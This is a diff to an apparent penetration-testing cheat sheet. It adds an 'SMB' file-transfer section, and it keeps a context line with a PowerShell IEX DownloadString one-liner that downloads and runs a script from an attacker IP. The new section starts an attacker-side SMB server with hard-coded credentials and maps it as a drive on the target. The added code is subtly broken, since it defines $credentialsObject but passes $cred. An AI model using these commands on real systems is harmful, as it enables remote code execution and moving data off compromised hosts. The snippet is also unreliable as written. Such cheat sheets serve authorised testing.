@@ -439,6 +439,24 @@ Download a file using "System.Net.WebClient" (DownloadString method with IEX cmd
 IEX (New-Object System.Net.WebClient).DownloadString('http://10.x.x.x/file.ps1')
 ```
 
+### SMB
+
+Start the server on the attacker system:
+
+```
+smbserver.py SHARE . -smb2support -username smbuser -password S0m3Pa$$W0@!
+```
+
+On the target system, create a credentials object and map a drive to the attacker box:
+
+```
+$username = 'smbuser'
+$password = ConvertTo-SecureString 'S0m3Pa$$W0@!' -AsPlainText -Force
+$credentialsObject = New-Object System.Management.Automation.PSCredential($username, $password)
+New-PSDrive -Name TMPSHARE -PSProvider FileSystem -Credential $cred -Root \\x.x.x.x\SHARE
+cd TMPSHARE:
+```
+
 ## Active Directory
 
 Commands below require the "ActiveDirectory" module to be installed:
